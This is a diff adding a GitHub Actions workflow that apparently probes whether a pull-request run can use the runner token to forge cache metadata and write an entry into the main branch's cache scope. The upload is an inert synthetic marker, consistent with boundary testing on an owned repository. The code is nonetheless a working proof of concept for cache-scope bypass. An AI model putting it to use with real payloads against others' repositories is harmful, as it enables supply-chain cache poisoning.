@@ -1,0 +1,80 @@
+name: Owned cache metadata scope boundary
+
+on:
+  workflow_dispatch:
+  pull_request:
+    paths:
+      - cache-scope-trigger.txt
+
+permissions:
+  contents: read
+
+jobs:
+  scope_probe:
+    runs-on: ubuntu-24.04
+    steps:
+      - name: Create inert cache payload
+        shell: bash
+        run: |
+          mkdir -p probe
+          printf 'SYNTHETIC_CACHE_SCOPE_MARKER_%s\n' "$GITHUB_RUN_ID" > probe/cache.txt
+
+      - name: Save in token's normal branch scope
+        uses: actions/cache/save@v6
+        with:
+          path: probe/cache.txt
+          key: owned-cache-scope-normal-20260923-${{ github.run_id }}
+
+      - name: Test caller supplied cache metadata
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const crypto = require('crypto');
+            const token = process.env.ACTIONS_RUNTIME_TOKEN;
+            const root = process.env.ACTIONS_RESULTS_URL;
+            if (!token || !root || !process.env.ACTIONS_CACHE_SERVICE_V2) {
+              throw new Error('Cache v2 runtime context unavailable');
+            }
+            const service = 'github.actions.results.api.v1.CacheService';
+            const rpc = method => new URL(`/twirp/${service}/${method}`, root);
+            const version = crypto.createHash('sha256').update('probe/cache.txt|zstd-without-long|1.0').digest('hex');
+            const key = `owned-cache-scope-metadata-20260923-${context.runId}`;
+            const metadata = {
+              repositoryId: '1383411228',
+              scope: [{scope: 'refs/heads/main', permission: '2'}]
+            };
+            const headers = {Authorization: `Bearer ${token}`, 'Content-Type': 'application/json'};
+            const call = async (method, body) => {
+              const response = await fetch(rpc(method), {
+                method: 'POST', headers, body: JSON.stringify(body)
+              });
+              const result = await response.json();
+              return {status: response.status, result};
+            };
+            console.log(`EVENT=${context.eventName}`);
+            console.log(`REF=${context.ref}`);
+            console.log(`CACHE_MODE=${process.env.ACTIONS_CACHE_MODE || '<unset>'}`);
+            console.log(`METADATA_KEY=${key}`);
+            const created = await call('CreateCacheEntry', {metadata, key, version});
+            const uploadUrl = created.result.signedUploadUrl || created.result.signed_upload_url;
+            console.log(`CREATE_STATUS=${created.status}`);
+            console.log(`CREATE_OK=${created.result.ok === true}`);
+            console.log(`CREATE_UPLOAD_URL_PRESENT=${Boolean(uploadUrl)}`);
+            console.log(`CREATE_DENIED=${String(created.result.message || '').startsWith('cache write denied:')}`);
+            if (!uploadUrl) return;
+
+            const payload = Buffer.from(`SYNTHETIC_CACHE_SCOPE_METADATA_${context.runId}\n`);
+            const uploaded = await fetch(uploadUrl, {
+              method: 'PUT',
+              headers: {'x-ms-blob-type': 'BlockBlob', 'Content-Type': 'application/octet-stream'},
+              body: payload
+            });
+            console.log(`UPLOAD_STATUS=${uploaded.status}`);
+            if (uploaded.status !== 201) return;
+
+            const finalized = await call('FinalizeCacheEntryUpload', {
+              metadata, key, sizeBytes: String(payload.length), version
+            });
+            console.log(`FINALIZE_STATUS=${finalized.status}`);
+            console.log(`FINALIZE_OK=${finalized.result.ok === true}`);
+            console.log(`FINALIZE_ENTRY_ID_PRESENT=${Boolean(finalized.result.entryId || finalized.result.entry_id)}`);
